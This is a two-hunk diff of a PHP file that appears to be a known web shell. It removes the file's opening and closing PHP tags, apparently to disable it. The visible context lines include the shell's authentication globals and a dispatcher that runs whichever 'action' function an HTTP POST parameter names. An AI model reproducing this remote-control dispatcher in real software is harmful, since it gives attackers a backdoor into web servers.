@@ -1,4 +1,4 @@
-<?php
+
 global $auth_pass,$color,$default_action,$default_use_ajax,$default_charset,$sort;
 global $cwd,$os,$safe_mode, $in;
 
@@ -1515,4 +1515,4 @@ if( empty($_POST['a']) )
 if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
         call_user_func('action' . $_POST['a']);
 exit;
-?>
+
